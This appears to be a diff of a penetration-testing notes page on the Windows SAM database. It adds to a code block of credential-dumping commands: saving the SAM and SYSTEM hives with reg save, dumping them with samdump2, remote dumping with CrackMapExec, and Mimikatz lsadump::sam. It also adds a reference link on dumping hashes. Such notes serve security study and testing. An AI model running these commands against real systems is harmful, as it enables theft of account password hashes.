@@ -8,16 +8,21 @@ The Security Accounts Manager (SAM) is a database file in Windows that contains 
 
 The SAM is a database file that contains local accounts for the host, typically those found with the `net user` command.
 
-### Dumping the SAM
-
 ```bash
 # Manually extracting the SAM
 reg save HKLM\sam sam
 reg save HKLM\system system
 
+# Analyzing extracted files
+samdump2 system sam 
+
 # Dumping the SAM remotely with CrackMapExec
 crackmapexec smb $ip -u $username -p $password --sam
 
 # Dumping the SAM with Mimikatz
-mimikatz lsadump::sam
+mimikatz lsadump::sam    
 ```
+
+### References
+
+{% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry" %}
